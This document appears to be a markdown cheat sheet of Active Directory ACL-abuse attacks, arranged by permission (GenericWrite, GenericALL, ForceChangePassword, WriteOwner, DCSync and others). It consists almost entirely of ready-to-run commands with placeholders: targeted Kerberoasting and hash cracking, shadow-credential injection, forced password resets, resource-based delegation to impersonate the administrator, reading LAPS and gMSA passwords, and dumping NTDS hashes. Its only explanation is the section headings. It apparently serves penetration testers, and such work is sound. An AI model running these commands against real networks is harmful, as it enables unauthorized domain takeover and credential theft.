- [GenericWrite](#genericwrite)
- [GenericALL](#genericall)
- [ForceChangePassword](#forcechangepassword)
- [AddMember](#addmember)
- [WriteOwner](#writeowner)
- [AddKeyCredentialLink](#addkeycredentialLink)
- [ReadLAPSPassword](#readlapspassword)
- [ReadGMSAPassword](#readgmsapassword)
- [DCSync](#dcsync)
## GenericWrite
### targetKerberoasting
```bash
python targetedKerberoast.py -v -d <domain> -u <username> -p <password>
```

```bash
hashcat -m 13100 -a 0 <hash_file> rockyou.txt --force
```
### ShadowCredentials
```bash
certipy shadow auto -u username@domain -p <password> -account <target_username> -dc-ip <ip>
```
Using Kerberos
```bash
certipy shadow auto -username username@domain -p <password> -k -account <target_username> -target <dc>
```
## GenericALL
### Password Change
```bash
net rpc password <username> <new_password> -U <domain>/<username>%<hash> -S <dc> --pw-nt-hash
```
### RBCD
```bash
rbcd.py -delegate-from '<machine_name>' -delegate-to '<target>' -dc-ip <ip> -action 'write' '<domain>/<username>:<password>'
```

```bash
getST.py -spn 'cifs/<dc>' -impersonate administrator -dc-ip <ip> '<domain>/<machine_name>:<password>'
```

```bash
export KRB5CCNAME=administrator.ccache
```
## ForceChangePassword
```bash
net rpc password <TargetUser> <new_password> -U "DOMAIN"/"ControlledUser"%"Password" -S <DomainController>
```

```bash
bloodyAD --host <ip> -d <dc> -u <username> -p <password> set password <target_userename> <new_password>
```

```bash
python rpcchangepwd.py <domain>/<username>:<password>@<ip> -newpass <new_password>
```
## AddMember
```
net rpc group addmem <target_group> <username> -U <domain>/<username> -S <dc>
```
## WriteOwner
```bash
owneredit.py -action write -new-owner <username> -target <group_name> <domain>/<username>:<password>
```

```bash
dacledit.py -action 'write' -rights 'WriteMembers' -principal <username> -target-dn <dn> <domain>/<username>:<password>
```

```bash
bloodyAD.py -d <domain> -u <username> -p <password> --host <dc> add groupMember <target_group> <username>
```
## AddKeyCredentialLink
```bash
python3 pywhisker.py -d <domain> --dc-ip <ip> -u <username> -H :<hashes> --target <target_username> --action "add"
```

```bash
certipy shadow auto -username <username>@<domain> -hashes :<hashes> -account <target_username>
```
## ReadLAPSPassword
```bash
nxc smb <target> -u <username> -p <password> --laps
```
## ReadGMSAPassword
```bash
nxc ldap <target> -u <username> -p <password> --gmsa
```
## DCSync
```bash
secretsdump.py <dc> -k
```

```bash
nxc smb <domain> -u <username> -p <password> --ntds
```

```bash
nxc smb <domain> -k --use-kcache --ntds
```
# Resources
- https://www.thehacker.recipes/ad/movement/dacl/
- https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/acl-abuse
